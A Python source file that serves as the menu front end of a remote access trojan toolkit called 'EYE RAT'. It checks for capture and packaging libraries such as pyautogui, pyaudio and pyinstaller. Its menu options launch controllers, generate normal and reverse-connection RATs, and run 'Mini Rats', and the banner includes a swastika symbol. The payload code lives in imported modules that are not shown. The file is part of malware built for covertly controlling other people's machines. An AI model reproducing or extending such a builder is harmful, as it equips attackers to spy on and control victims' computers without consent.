from time import sleep
from tools import generator, updater
from colorama import Back, Fore
from tools import launcher
from os import system
from platform import system as osType
from subprocess import getoutput
from os.path import isfile
from requests import get
from tools.MNLauncher import main as miniRats


def chdps() -> None:
    q_modules = [
        "opencv",
        "numpy",
        "pyautogui",
        "pyaudio",
        "cryptography",
        "pymsgbox",
        "pillow",
        "psutil",
        "colorama",
        "pyinstaller",
    ]
    nt_install = []
    pip_list = getoutput("pip list").lower()
    for pkg in q_modules:
        if pkg not in pip_list:
            nt_install.append(pkg)
    if nt_install:
        for nt_pkg in nt_install:
            print(
                f"{Fore.LIGHTRED_EX}[ ! ] Module {nt_pkg} not found !\n"
                f"Try with : pip3 install {nt_pkg}\n\n"
            )
        exit()


def clear() -> None:
    if "windows" in osType().lower():
        system("cls")
    else:
        system("clear")


def main() -> None:
    sleep(3)
    clear()
    selection = input(f"""
          ____                                                               
         |{Back.RED} {Fore.BLACK}卐{Fore.RESET} {Back.RESET}|                                                              
         |{Back.RED}____{Back.RESET}|                                                              
        _|{Back.RED}____{Back.RESET}|_                                                             
       {Fore.LIGHTBLACK_EX}  /  @@`.                                                             
       .<     __O                                                            
      {Fore.LIGHTBLACK_EX}/\ \.-.' \     {Fore.CYAN}███████╗██╗   ██╗███████╗   ██████╗  █████╗ ████████╗{Fore.RESET}
     {Fore.LIGHTBLACK_EX}J  `.|`.\/ \    {Fore.CYAN}██╔════╝╚██╗ ██╔╝██╔════╝   ██╔══██╗██╔══██╗╚══██═══╝{Fore.RESET}
     {Fore.LIGHTBLACK_EX}| |_.|  | | |   {Fore.CYAN}█████╗   ╚████╔╝ █████╗     ██████═╝███████║   ██║   {Fore.RESET}
      {Fore.LIGHTBLACK_EX}\__.'`.|-' /   {Fore.CYAN}██═══╝    ╚██═╝  ██═══╝     ██══██╗██══██║   ██║   {Fore.RESET}
      {Fore.LIGHTBLACK_EX}L   /|o`--'\   {Fore.CYAN}███████╗   ██║   ███████╗   ██║  ██║██║  ██║   ██║   {Fore.RESET}
      {Fore.LIGHTBLACK_EX}|  /\/\/\   \  {Fore.CYAN}╚══════╝   ╚═╝   ╚══════╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {Fore.RESET}
{Fore.LIGHTBLACK_EX}     J /      `.__\                                                         
{Fore.LIGHTBLACK_EX}     |/         /  \                                                        
       \\      .'`.  `.                                            .'         
    ____)_/\_(____`.  `-._______________________________________.'/         
   (___._/  \_.___) `-.________________________________________.-'          

                  {Fore.RED}[ {Fore.CYAN}1 {Fore.RED}]{Fore.CYAN}Client launcher{Fore.RED}                      [ {Fore.CYAN}2 {Fore.RED}] {Fore.CYAN}Generate normal connection rat
                                                                                                    
                  {Fore.RED}[ {Fore.CYAN}3 {Fore.RED}]{Fore.CYAN}Server launcher(Multiple clients){Fore.RED}    [ {Fore.CYAN}4 {Fore.RED}] {Fore.CYAN}Generate reverse connection rat 

                  {Fore.RED}[ {Fore.CYAN}5 {Fore.RED}]{Fore.CYAN}Mini Rats{Fore.RED}                           [ {Fore.CYAN}6 {Fore.RED}] {Fore.CYAN}Developer information
                  
                  {Fore.RED}[ {Fore.CYAN}7 {Fore.RED}] {Fore.CYAN}Check for updates
                   
                   {Fore.LIGHTGREEN_EX}Enter your selection :{Fore.MAGENTA} """)
    clear()
    if selection == '1':
        try:
            launcher.main("client")
        except KeyboardInterrupt:
            pass
    elif selection == '2':
        try:
            generator.main("server", None)
        except KeyboardInterrupt:
            pass
    elif selection == '3':
        try:
            launcher.main("server")
        except KeyboardInterrupt:
            pass
    elif selection == '4':
        try:
            generator.main("client", None)
        except KeyboardInterrupt:
            pass
    elif selection == "5":
        try:
            miniRats()
        except KeyboardInterrupt:
            pass
    elif selection == '6':
        input("""
      _---~~(~~-_.
    _{        )   )         
  ,   ) -~~- ( ,-' )_       Hi, I'm Mani
 (  `-,_..`., )-- '_,)      You can get my complete information from this site:
( ` _)  (  -~( -_ `,  }     https://adolfmacro.github.io/mani/
(_-  _  ~_-~~~~`,  ,' )     
  `~ -^(    __;-,((()))     My GitHub Address: https://github.com/adolfmacro
        ~~~~ {_ -_(())      E-mail : m4nikamran@gmail.com
               `\  }        Telegram : https://t.me/manikamran
                 { }      
     
     
    Enter to exit : """)
    elif selection == "7":
        updater.mainUpdater()


if __name__ == '__main__':
    chdps()
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}ヽ(･_･)/{Fore.CYAN} CTR-C {Fore.RED}\\(･_･)/{Fore.RESET}")
            break